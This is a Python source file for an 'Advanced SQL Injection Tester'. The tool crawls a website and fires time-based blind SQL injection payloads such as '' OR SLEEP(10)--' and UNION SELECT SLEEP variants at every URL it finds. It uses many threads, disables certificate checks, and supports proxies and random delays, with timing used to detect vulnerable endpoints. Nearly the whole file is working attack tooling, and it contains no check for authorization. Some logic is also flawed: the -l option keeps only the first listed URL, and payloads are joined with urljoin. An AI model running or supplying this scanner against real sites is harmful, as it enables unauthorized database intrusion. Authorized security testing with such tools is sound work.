import argparse
import requests
import concurrent.futures
from colorama import Fore, Style, init
import time
import sys
from urllib.parse import urlparse, urljoin
import csv
import json
import logging
import random
from requests.exceptions import RequestException, Timeout
import urllib3
import sqlite3
from bs4 import BeautifulSoup
import matplotlib.pyplot as plt
from sklearn.cluster import KMeans
import numpy as np
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)  # Initialize colorama

BANNER = f"""{Fore.CYAN}
 ____   ____   ___   _     ___   ___   ___  
| __ ) / ___| / _ \ | |   |_ _| |__ \ / _ \ 
|  _ \ \___ \| | | || |    | |    ) | | | |
| |_) | ___) | |_| || |___ | |   / /| |_| |
|____/ |____/ \__\_\|_____|___| |____\\___/ 
                                         
        Advanced SQL Injection Tester By a7t0fwa7 inspired from Coffinxp
{Style.RESET_ALL}"""

class AdvancedSQLiTester:
    def __init__(self, config):
        self.config = config
        self.urls = [config.url] if config.url else []
        self.payloads = []
        self.results = []
        self.setup_session()
        self.setup_logging()
        self.setup_database()

    def setup_session(self):
        self.session = requests.Session()
        retries = Retry(total=3, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
        adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=retries)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

    def setup_logging(self):
        level = logging.DEBUG if self.config.verbose else logging.INFO
        logging.basicConfig(level=level, format='%(asctime)s - %(levelname)s - %(message)s')

    def setup_database(self):
        if self.config.use_db:
            self.conn = sqlite3.connect('sqli_results.db')
            self.cursor = self.conn.cursor()
            self.cursor.execute('''CREATE TABLE IF NOT EXISTS results
                                (url TEXT, vulnerable BOOLEAN, response_time REAL, status_code INTEGER, content_length INTEGER)''')

    def crawl_website(self, base_url):
        logging.info(f"Crawling website: {base_url}")
        visited = set()
        to_visit = [base_url]
        
        while to_visit:
            url = to_visit.pop(0)
            if url in visited:
                continue
            visited.add(url)
            
            try:
                response = self.session.get(url, timeout=self.config.timeout)
                soup = BeautifulSoup(response.text, 'html.parser')
                for link in soup.find_all('a'):
                    href = link.get('href')
                    if href:
                        full_url = urljoin(base_url, href)
                        if full_url.startswith(base_url) and full_url not in visited:
                            to_visit.append(full_url)
            except Exception as e:
                logging.error(f"Error crawling {url}: {str(e)}")
        
        logging.info(f"Crawling completed. Found {len(visited)} URLs.")
        return list(visited)

    def generate_payloads(self):
        logging.info("Generating payloads")
        base_payloads = [
            "' OR SLEEP(10)--",
            "' UNION SELECT SLEEP(10)--",
            "1' AND SLEEP(10)--",
            "1 AND (SELECT * FROM (SELECT(SLEEP(10)))a)--",
            "' AND (SELECT 9999 FROM (SELECT SLEEP(10))a)--",
        ]
        generated = []
        for payload in base_payloads:
            generated.append(payload)
            generated.append(payload.replace("'", '"'))
            generated.append(payload.replace(" ", "/**/"))
        logging.info(f"Generated {len(generated)} payloads")
        return generated

    def perform_request(self, url, payload):
        url_with_payload = urljoin(url, payload)
        start_time = time.time()

        headers = {
            'User-Agent': self.config.user_agent,
            'Cookie': f'cookie={self.config.cookie}' if self.config.cookie else ''
        }

        proxies = {'http': self.config.proxy, 'https': self.config.proxy} if self.config.proxy else None

        try:
            if self.config.delay:
                time.sleep(random.uniform(0, self.config.delay))

            with self.session.get(url_with_payload, headers=headers, proxies=proxies, 
                                  timeout=self.config.timeout, verify=False, stream=True) as response:
                response_time = time.time() - start_time
                content_length = int(response.headers.get('Content-Length', 0))

                is_vulnerable = response_time >= 10
                result = {
                    'url': url_with_payload,
                    'vulnerable': is_vulnerable,
                    'response_time': response_time,
                    'status_code': response.status_code,
                    'content_length': content_length
                }
                self.results.append(result)
                logging.debug(f"Tested: {url_with_payload} - Vulnerable: {is_vulnerable}")

                if self.config.use_db:
                    self.cursor.execute("INSERT INTO results VALUES (?, ?, ?, ?, ?)",
                                        (result['url'], result['vulnerable'], result['response_time'], result['status_code'], result['content_length']))
                    self.conn.commit()

                return result
        except Timeout:
            logging.warning(f"Timeout occurred for {url_with_payload}")
            self.results.append({
                'url': url_with_payload,
                'vulnerable': False,
                'response_time': self.config.timeout,
                'status_code': 'Timeout',
                'error': 'Request timed out'
            })
        except RequestException as e:
            logging.error(f"Error testing {url_with_payload}: {str(e)}")
            self.results.append({
                'url': url_with_payload,
                'vulnerable': False,
                'response_time': 0,
                'status_code': 'Error',
                'error': str(e)
            })
        return None

    def run(self):
        if self.config.crawl:
            self.urls = self.crawl_website(self.config.url)
        
        if self.config.generate_payloads:
            self.payloads = self.generate_payloads()
        else:
            with open(self.config.payloads, 'r') as file:
                self.payloads = file.read().splitlines()

        total_requests = len(self.urls) * len(self.payloads)
        logging.info(f"Starting tests with {len(self.urls)} URLs and {len(self.payloads)} payloads")

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = [executor.submit(self.perform_request, url, payload) 
                       for url in self.urls for payload in self.payloads]
            
            for _ in concurrent.futures.as_completed(futures):
                pass

    def display_results(self):
        vulnerable_count = sum(1 for result in self.results if result.get('vulnerable', False))
        print(f"\nResults: {vulnerable_count} potentially vulnerable URLs found out of {len(self.results)} tested.")
        
        for result in self.results:
            if result.get('vulnerable', False):
                print(f"{Fore.YELLOW}✔️  SQLi Found! URL: {result['url']} - Response Time: {result['response_time']:.2f}s - Status: {result['status_code']}")
            elif 'error' in result:
                print(f"{Fore.RED}❌ Error. URL: {result['url']} - Error: {result['error']}")
            else:
                print(f"{Fore.RED}❌ Not Vulnerable. URL: {result['url']} - Response Time: {result['response_time']:.2f}s - Status: {result['status_code']}")

    def save_results(self):
        if not self.config.output:
            return
        
        extension = self.config.output.split('.')[-1].lower()
        if extension == 'csv':
            self._save_csv()
        elif extension == 'json':
            self._save_json()
        else:
            print(f"{Fore.RED}[Err] Unsupported output format. Use .csv or .json")

    def _save_csv(self):
        with open(self.config.output, 'w', newline='') as csvfile:
            fieldnames = ['url', 'vulnerable', 'response_time', 'status_code', 'content_length', 'error']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            for result in self.results:
                writer.writerow(result)
        print(f"Results saved to {self.config.output}")

    def _save_json(self):
        with open(self.config.output, 'w') as jsonfile:
            json.dump(self.results, jsonfile, indent=2)
        print(f"Results saved to {self.config.output}")

    def analyze_results(self):
        response_times = [r['response_time'] for r in self.results if 'response_time' in r]
        if len(response_times) < 2:
            logging.warning("Not enough data for analysis")
            return

        kmeans = KMeans(n_clusters=2, random_state=0).fit([[rt] for rt in response_times])
        
        plt.figure(figsize=(10, 6))
        plt.scatter(range(len(response_times)), response_times, c=kmeans.labels_)
        plt.title('Response Time Clustering')
        plt.xlabel('Request Number')
        plt.ylabel('Response Time (s)')
        plt.savefig('response_time_analysis.png')
        print(f"Response time analysis saved to response_time_analysis.png")

    def close(self):
        if self.config.use_db:
            self.conn.close()

def validate_url(url):
    parsed = urlparse(url)
    return bool(parsed.netloc and parsed.scheme)

def main():
    parser = argparse.ArgumentParser(description="Advanced BSQLi - Perform extensive SQL injection testing.")
    parser.add_argument("-u", "--url", help="Single URL to scan or base URL for crawling.")
    parser.add_argument("-l", "--list", help="Text file containing a list of URLs to scan.")
    parser.add_argument("-p", "--payloads", help="Text file containing the payloads to append to the URLs.")
    parser.add_argument("-c", "--cookie", help="Cookie to include in the GET request.")
    parser.add_argument("-t", "--threads", type=int, default=40, help="Number of concurrent threads")
    parser.add_argument("-T", "--timeout", type=float, default=30, help="Timeout for each request in seconds")
    parser.add_argument("-o", "--output", help="Output file to save results (CSV or JSON format)")
    parser.add_argument("-ua", "--user-agent", default="BSQLi Tester", help="User-Agent string to use")
    parser.add_argument("-x", "--proxy", help="Proxy to use for requests (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-d", "--delay", type=float, help="Add a random delay between requests (in seconds)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--crawl", action="store_true", help="Crawl the website for additional URLs")
    parser.add_argument("--generate-payloads", action="store_true", help="Automatically generate payloads")
    parser.add_argument("--use-db", action="store_true", help="Store results in SQLite database")
    
    args = parser.parse_args()

    if not (args.url or args.list):
        print(f"{Fore.RED}[Err] Either -u or -l is required.")
        sys.exit(1)

    if args.url and not validate_url(args.url):
        print(f"{Fore.RED}[Err] Invalid URL provided.")
        sys.exit(1)

    if args.list:
        try:
            with open(args.list, 'r') as file:
                urls = [url.strip() for url in file if validate_url(url.strip())]
            if not urls:
                print(f"{Fore.RED}[Err] No valid URLs found in the provided file.")
                sys.exit(1)
            args.url = urls[0]  # Set the first URL as the base URL for potential crawling
        except IOError:
            print(f"{Fore.RED}[Err] Error reading URL file.")
            sys.exit(1)

    if not args.generate_payloads and not args.payloads:
        print(f"{Fore.RED}[Err] Either --generate-payloads or -p is required.")
        sys.exit(1)

    if args.threads <= 0:
        print(f"{Fore.RED}[Err] Thread count must be a positive integer.")
        sys.exit(1)

    print(BANNER)

    tester = AdvancedSQLiTester(args)
    tester.run()
    tester.display_results()
    tester.save_results()
    tester.analyze_results()
    tester.close()

if __name__ == "__main__":
    main()
